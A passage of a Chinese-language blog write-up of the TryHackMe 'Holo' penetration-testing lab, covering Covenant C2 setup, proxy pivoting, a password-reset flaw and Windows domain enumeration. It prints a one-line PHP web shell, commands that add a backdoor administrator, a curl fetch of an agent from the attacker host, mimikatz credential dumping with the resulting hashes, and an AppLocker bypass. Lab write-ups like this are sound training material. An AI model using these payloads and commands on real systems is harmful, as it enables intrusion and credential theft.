+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::</span><br><span class="line">        ````</span><br><span class="line"></span><br><span class="line">        最后爆出来是 `linux-admin:linuxrulez`</span><br><span class="line"></span><br><span class="line">        那么现在就可以使用 `ssh` 来直接登录了：</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6731f25ad29ded1a8c8103c2.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- `Covenant` `C2` 服务器的使用</span><br><span class="line"></span><br><span class="line">    - 安装</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  git clone —recurse-submodules <a target="_blank" rel="noopener" href="https://github.com/cobbr/Covenant">https://github.com/cobbr/Covenant</a></p>
+<p>  dotnet run —project /opt/Covenant/Covenant</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6735cebed29ded1a8c8d1f3a.png)</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6735cf20d29ded1a8c8d8f59.png)</span><br><span class="line"></span><br><span class="line">    - 使用-`Listener`</span><br><span class="line"></span><br><span class="line">        使用中主要有四个阶段：创建监听器，生成 `stager`(即 `payload`) ，部署 `grunt`(应该是反弹 `shell`) ，利用 `grunt`</span><br><span class="line"></span><br><span class="line">        这些操作阶段都可以使用别的工具，但 `Covenant` 提供了一个集成化的平台，也可以更好的管理协作</span><br><span class="line"></span><br><span class="line">        第一步是创建一个监听器，其有四个自带的配置文件：</span><br><span class="line"></span><br><span class="line">        - `CustomHttpProfile` 不需要任何 cookie 的自定义配置文件。</span><br><span class="line">        - `DefaultBridgeProfile` C2 桥的默认配置文件。</span><br><span class="line">        - `DefaultHttpProfile` 默认 HTTP 配置文件。</span><br><span class="line">        - `TCPBridgeProfile` C2 桥的默认 TCP 配置文件。</span><br><span class="line"></span><br><span class="line">        在 `listener` 界面创建一个，其几个重要参数如下：</span><br><span class="line"></span><br><span class="line">        - `Name` 监听器名称</span><br><span class="line">        - `BindAddress` 监听器绑定的本地地址，一般选择0.0.0.0</span><br><span class="line">        - `BindPort` 监听器绑定的本地端口</span><br><span class="line">        - `ConnectPort` 反弹shell反弹到的端口</span><br><span class="line">        - `ConnectAddress` 反弹到的地址，这里即是 `tun0` 的ip</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6735d750d29ded1a8c95d11e.png)</span><br><span class="line"></span><br><span class="line">        下面这个是错误示范：</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6735d393d29ded1a8c921b4e.png)</span><br><span class="line"></span><br><span class="line">        看状态栏是未初始化，原因在这里：</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6735d7b0d29ded1a8c963bf9.png)</span><br><span class="line"></span><br><span class="line">        `bindport` 换一个就行</span><br><span class="line"></span><br><span class="line">    - 使用-`launcher`</span><br><span class="line"></span><br><span class="line">        可以创建一个启动器来快速部署 `grunts` ，有十种可供选择：</span><br><span class="line"></span><br><span class="line">        - `Binary` 生成自定义二进制文件以启动 `grunt`，不依赖于系统二进制文件。</span><br><span class="line">        - `Shellcode` 使用 `donut` 将二进制文件转换为 `shellcode`，https://github.com/TheWover/donut</span><br><span class="line">        - `PowerShell` 生成 `PowerShell` 代码以使用 `powershell.exe` 启动 `grunt`。</span><br><span class="line">        - `MSBuild` 使用 `msbuild.exe` 生成 `MSBuild XML` 文件以启动 `grunt`，https://lolbas-project.github.io/lolbas/Binaries/Msbuild/</span><br><span class="line">        - `InstallUtil` 使用 `installutil.exe` 生成 `InstallUtil XML` 文件以启动 `grunt`，https://lolbas-project.github.io/lolbas/Binaries/Installutil/</span><br><span class="line">        - `Mshta` 使用 `mshta.exe` 生成 `HTA` 文件以启动 `grunt`，https://lolbas-project.github.io/lolbas/Binaries/Mshta/</span><br><span class="line">        - `Regsrv32` 使用 `regsrv32.exe` 生成 `SCT` 文件以启动 `grunt`，https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/</span><br><span class="line">        - `Wmic` 使用 `wmic.exe` 生成 `XSL` 文件以启动 `grunt`， https://lolbas-project.github.io/lolbas/Binaries/Wmic/</span><br><span class="line">        - `Cscript` 使用 `cscript.exe` 生成 `JScript` 文件以启动 `grunt`，https://lolbas-project.github.io/lolbas/Binaries/Cscript/</span><br><span class="line">        - `Wscript` 使用 `wscript.exe` 生成 `JScript` 文件以启动 `grunt`，https://lolbas-project.github.io/lolbas/Binaries/Wscript/</span><br><span class="line"></span><br><span class="line">        这里重点记录二进制启动的配置选项：</span><br><span class="line"></span><br><span class="line">        - `Listener` 将与之通信的监听器。</span><br><span class="line">        - `ImplantTemplate` 植入启动器将使用的类型。</span><br><span class="line">        - `DotNetVersion` 启动器将使用的 .NET 版本，取决于 `ImplantTemplate`</span><br><span class="line">        - `Delay` `grunt` 在回调之间休眠的时间。较大的延迟有助于隐秘通信。</span><br><span class="line">        - `JitterPercent` `Delay` 中变化的百分比。</span><br><span class="line">        - `ConnectAttempts` `grunt` 在退出前尝试重新连接服务器的次数。</span><br><span class="line">        - `KillDate` 指定 `grunt` 退出并停止回调的日期。</span><br><span class="line"></span><br><span class="line">- `S-SRV01`</span><br><span class="line"></span><br><span class="line">    拿到 `L-SRV01` 的 `root` 后拓扑图直接更新了，就不用再扫存活主机了：</span><br><span class="line"></span><br><span class="line">    ![](https://pic.imgdb.cn/item/6731f3ddd29ded1a8c8259a8.png)</span><br><span class="line"></span><br><span class="line">    - 扫描打点</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6731f988d29ded1a8c86e4ab.png)</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6731f9a0d29ded1a8c86fa78.png)</span><br><span class="line"></span><br><span class="line">        然后继续用 `stoaway` 来开一个关于 `L-SRV01` 的代理来访问 `S-SRV01`</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6731fa21d29ded1a8c875fc6.png)</span><br><span class="line"></span><br><span class="line">        这里本来想传一个 `dirsearch` 上去扫，但是：</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6731fd33d29ded1a8c89e435.png)</span><br><span class="line"></span><br><span class="line">        那就直接看这个登陆界面好了，回顾了一下手里的信息，还有个高权限用户 `gurag` 还没用过，通过 `forgot password` 那页有用户名遍历，可以得出该用户确实存在：</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6731ffc0d29ded1a8c8bf73a.png)</span><br><span class="line"></span><br><span class="line">        此时又注意到后面的空参数 `user_token` ，这个东西可以在网站返回包的 `set-cookie` 中找到：</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6732001bd29ded1a8c8c735d.png)</span><br><span class="line"></span><br><span class="line">        那么填上去再次请求，发现直接跳转到 `reset.php`</span><br><span class="line"></span><br><span class="line">        再次填入用户名：</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/673200e5d29ded1a8c8d3b26.png)</span><br><span class="line"></span><br><span class="line">        此时 `password` 参数可以自定义，设置为 `gurag:gurag` ，并拿到 `HOLO&#123;bcfe3bcb8e6897018c63fbec660ff238&#125;`</span><br><span class="line"></span><br><span class="line">    - 跳板部署</span><br><span class="line"></span><br><span class="line">        考虑到 `foxyproxy` 只能代理浏览器，功能很受限制，我们需要引入一个新工具 `proxychains4`</span><br><span class="line"></span><br><span class="line">        其作用就是将所有 `tcp` 命令通过代理转发，即可以直接在本机上通过 `L-SRV01` 的代理扫描 `S-SRV01` ，而不需要把工具慢慢传到 `L-SRV01` 上</span><br><span class="line"></span><br><span class="line">        直接 `apt-get install proxychains` 即可，配置文件在 `/etc/proxychains.conf`</span><br><span class="line"></span><br><span class="line">        在最后面加上代理：</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6735ef49d29ded1a8caab146.png)</span><br><span class="line"></span><br><span class="line">        随后在所有命令前面加上 `proxychains4` 即可通过该代理转发</span><br><span class="line"></span><br><span class="line">        而值得注意的是，并不能使用 `ping` 来验证是否转发成功，因为 `ping` 是基于 `ICMP` ，而该工具仅转发 `TCP`</span><br><span class="line"></span><br><span class="line">    - 文件上传 `RCE`</span><br><span class="line"></span><br><span class="line">        登录进去发现文件上传：</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6732011ad29ded1a8c8d7093.png)</span><br><span class="line"></span><br><span class="line">        用 `wfuzz` 枚举上传后文件存放的目录：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  proxychains4 wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt —hc 404 <a target="_blank" rel="noopener" href="http://10.200.108.31/FUZZ">http://10.200.108.31/FUZZ</a> | tee srv_web_dict.txt</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](https://pic.imgdb.cn/item/673206dad29ded1a8c922119.png)</span><br><span class="line"></span><br><span class="line">试了一下存到了 `images/` 下</span><br><span class="line"></span><br><span class="line">这里 `thm` 一直在说有白名单只让上传 `.jpg`，然后讲了下怎么删除 `js` 代码</span><br><span class="line"></span><br><span class="line">然后有一大章在讲AV规避，就突然开始做免杀了</span><br><span class="line"></span><br><span class="line">但我这里直接传上去了（</span><br><span class="line"></span><br><span class="line">普通的确实会被逮捕：</span><br><span class="line"></span><br><span class="line">![](https://pic.imgdb.cn/item/67320843d29ded1a8c933d14.png)</span><br><span class="line"></span><br><span class="line">但是可以用一个很简洁的马绕过去：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  &lt;?=<code>$_GET[1]</code>?&gt;</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](https://pic.imgdb.cn/item/67320870d29ded1a8c936131.png)</span><br><span class="line"></span><br><span class="line">在这里发现用 `ls` 会报错，`dir` 没有问题，那么 `S-SRV01` 就是 `Windows`</span><br><span class="line"></span><br><span class="line">既然已经 `rce` 了，那就还是让其连接到 `stoaway` 上：&#x27;</span><br><span class="line"></span><br><span class="line">直接用 `upload` 页面传会显示太大，想用 `powershell` 下下来，但是奇怪的失败了，最后用 `curl` 成功了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  curl -o “windows_x64_agent.exe” <a target="_blank" rel="noopener" href="http://10.200.108.33:8000/windows_x64_agent.exe">http://10.200.108.33:8000/windows_x64_agent.exe</a></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">但还是连不上</span><br><span class="line"></span><br><span class="line">稍微有点舍本逐末了，通过 `whoami` 可以看出是高权限用户，直接用 `rce` 新建管理员用户，注意执行成功会有回显，密码那里应该是有长度和符号的要求</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  ?1=net user noone pass.2501! /add<br>  ?1=net localgroup administrators noone /add</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    `noone:pass.2501!`</span><br><span class="line"></span><br><span class="line">    然后直接 `ssh` 就能连，但是要从 `S-SRV01` 跳过去</span><br><span class="line"></span><br><span class="line">    ![](https://pic.imgdb.cn/item/6732137ed29ded1a8c9d9434.png)</span><br><span class="line"></span><br><span class="line">    在 `Users/Administrator/Desktop` 找到 `root.txt`</span><br><span class="line"></span><br><span class="line">    ![](https://pic.imgdb.cn/item/673213c0d29ded1a8c9dd35c.png)</span><br><span class="line"></span><br><span class="line">    `HOLO&#123;50f9614809096ffe2d246e9dd21a76e1&#125;`</span><br><span class="line"></span><br><span class="line">- `mimikatz` 转储凭据</span><br><span class="line"></span><br><span class="line">    传一下 `mimikatz.exe` 上去，</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords full” exit &gt; logonpasswords.txt</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">拿到这几个有价值一点的：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  watamet:d8d41e6cf762a8c77776a1843d4141c9:Nothingtoworry!<br>  S-SRV01$:3179c8ec65934b8d33ac9ec2a9d93400<br>  Administrator:4c529921152aab85192532e2c8771a92<br>  WDAGUtilityAccount:58f8e0214224aebc2c5f82fb7cb47ca1</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        即域用户 `watamet:Nothingtoworry!`</span><br><span class="line"></span><br><span class="line">- `PC-FILESRV01`</span><br><span class="line"></span><br><span class="line">    - 扫描打点</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6732195ed29ded1a8ca2df75.png)</span><br><span class="line"></span><br><span class="line">    - `rdp` 连接</span><br><span class="line"></span><br><span class="line">        既然已经拿到域用户账密就直接试着登录了，正常来讲现在应该用拿到的所有账户用 `crackmapexec` 做密码喷洒，但懒狗了</span><br><span class="line"></span><br><span class="line">        这里直接连了：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  proxychains4 xfreerdp /u:watamet /p:Nothingtoworry!  /h:600 /v:10.200.108.35</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    桌面上找到 `flag`:</span><br><span class="line"></span><br><span class="line">    ![](https://pic.imgdb.cn/item/6735efccd29ded1a8cab1967.png)</span><br><span class="line"></span><br><span class="line">- `applocker` 绕过</span><br><span class="line"></span><br><span class="line">    用 `L-SRV01` 当服务器上传 `stoaway` ，这里 `curl` 下来执行，发现被拦截了：</span><br><span class="line"></span><br><span class="line">    ![](https://pic.imgdb.cn/item/6735f520d29ded1a8cb00f32.png)</span><br><span class="line"></span><br><span class="line">    这是由于服务器上设置的白名单应用程序控制，即 `Applocker` ，其标志就是 **此程序被组策略阻止**，详细情况不再赘述</span><br><span class="line"></span><br><span class="line">    绕过 `Applocker` 通常要利用规则中的错误配置，即试着找到可用于执行程序的目录</span><br><span class="line"></span><br><span class="line">    可以使用脚本: https://github.com/sparcflow/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1</span><br><span class="line"></span><br><span class="line">    传上来用 `powershell` 来运行：</span><br><span class="line"></span><br><span class="line">    ![](https://pic.imgdb.cn/item/6735f8d0d29ded1a8cb357a9.png)</span><br><span class="line"></span><br><span class="line">- `Windows` 态势感知</span><br><span class="line"></span><br><span class="line">    这里引入两个工具:</span><br><span class="line">    </span><br><span class="line">    - [`Seatbelt`](https://github.com/GhostPack/Seatbelt)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>  Seatbelt.exe —group=system
+  Seatbelt.exe all
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其也支持远程使用：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  Seatbelt.exe -group=remote -computername=&lt;address&gt; -username=&lt;DOMAIN\user&gt; -password=&lt;password&gt;
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- [`SharpEDRChecker`](https://github.com/PwnDexter/SharpEDRChecker)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  .\SharpEDRChecker.exe
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    具体不细写了，传上去的是[构建好的 `Seatbelt.exe`](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)</span><br><span class="line"></span><br><span class="line">    但令人感慨的是他编译的好像环境不一样，我执行不了啊嗯</span><br><span class="line"></span><br><span class="line">    ~~懒狗了，假装这里有图.jpg~~</span><br><span class="line"></span><br><span class="line">- 更多的态势感知-`PowerView`</span><br><span class="line"></span><br><span class="line">    继续引入新工具 [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)</span><br><span class="line"></span><br><span class="line">    其用于在域上获取网络态势感知：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</code></pre><p>  Import-Module .\PowerView.ps1</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    随后可以运行其提供的所有命令</span><br><span class="line"></span><br><span class="line">    ![](https://pic.imgdb.cn/item/67360139d29ded1a8cba3673.png)</span><br><span class="line"></span><br><span class="line">    - `Get-NetLocalGroup`</span><br><span class="line"></span><br><span class="line">        列出本地所有组</span><br><span class="line"></span><br><span class="line">    - `Get-NetLocalGroupMember -Group &lt;group&gt;`</span><br><span class="line"></span><br><span class="line">        列出指定组的所有成员</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/673601e0d29ded1a8cbac096.png)</span><br><span class="line"></span><br><span class="line">    - `Get-NetLoggedon`</span><br><span class="line"></span><br><span class="line">        列举当前登录到本地机器的所有用户，其用于识别哪些用户不能接管，或者哪些用户应该在钓鱼等攻击中被作为目标</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6736035bd29ded1a8cbc4afe.png)</span><br><span class="line"></span><br><span class="line">    - `Get-DomainGPO`</span><br><span class="line"></span><br><span class="line">        列出安装的活动目录域 `GPO`</span><br><span class="line"></span><br><span class="line">    - `Find-LocalAdminAccess`</span><br><span class="line"></span><br><span class="line">        检查当前计算机所属域的所有主机，并检测当前用户是否为本地管理员，横向移动中很常用</span><br><span class="line"></span><br><span class="line">        ![](https://pic.imgdb.cn/item/6736047fd29ded1a8cbd6321.png)</span><br><span class="line"></span><br><span class="line">- 更多的态势感知-`Powershell`</span><br><span class="line"></span><br><span class="line">    处于各种情况，可能并不会有工具给我们用，所幸 `Powershell` 自带了一些命令，以下是其中一小部分：</span><br><span class="line"></span><br><span class="line">    - `Get-ScheduledTask`</span><br><span class="line"></span><br><span class="line">        列出所有计划任务，但有很多冗杂的默认启动任务，可以使用这个过滤：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>  Get-ScheduledTask -TaskPath &quot;\Users\*&quot;
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `Get-ScheduledTaskInfo`</span><br><span class="line"></span><br><span class="line">    指定任务的特定信息：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  Get-ScheduledTaskInfo -TaskName &lt;Full Path&gt;
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `whoami /priv`</span><br><span class="line"></span><br><span class="line">    枚举当前用户的 `SE` 权限，帮助提权枚举</span><br><span class="line"></span><br><span class="line">- `Get-ADGroup`</span><br><span class="line"></span><br><span class="line">    枚举域内用户组或所有组，但在这之前需要先导入 `AD` 模块：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  Import-Module ActiveDirectory; Get-ADGroup
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">随后会提示使用 `CLI` 过滤器，建议使用：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  samAccountName -like &quot;*&quot;
+  ```
+</code></pre><ul>
+<li><p><code>Get-ADGroupMember</code></p>
+<p>  与上一个类似，其列出 <code>AD</code> 域成员，用于定位特定用户</p>
+</li>
+<li><p><code>Get-ADPrincipalGroupMembership</code></p>
+<p>  检索用户/组</p>
+</li>
+</ul>
+</li>
+<li><p>提权</p>
+<p>  破防了，不看了</p>
+<p>  <img src="https://pic.imgdb.cn/item/67360c95d29ded1a8cc485bb.jpg" alt=""></p>
+</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>noone___
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://noone40404.github.io/2024/10/28/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8417%EF%BC%9AHolo/" title="THM打靶日寄17-Holo">http://noone40404.github.io/2024/10/28/THM打靶日寄17：Holo/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/THM/" rel="tag"><i class="fa fa-tag"></i> THM</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/10/27/THM%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%AF%8416%EF%BC%9Apassword%20attack/" rel="prev" title="THM学习日寄16-password attack">
+      <i class="fa fa-chevron-left"></i> THM学习日寄16-password attack
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/11/07/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8418%EF%BC%9ARA/" rel="next" title="THM打靶日寄18-RA">
+      THM打靶日寄18-RA <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
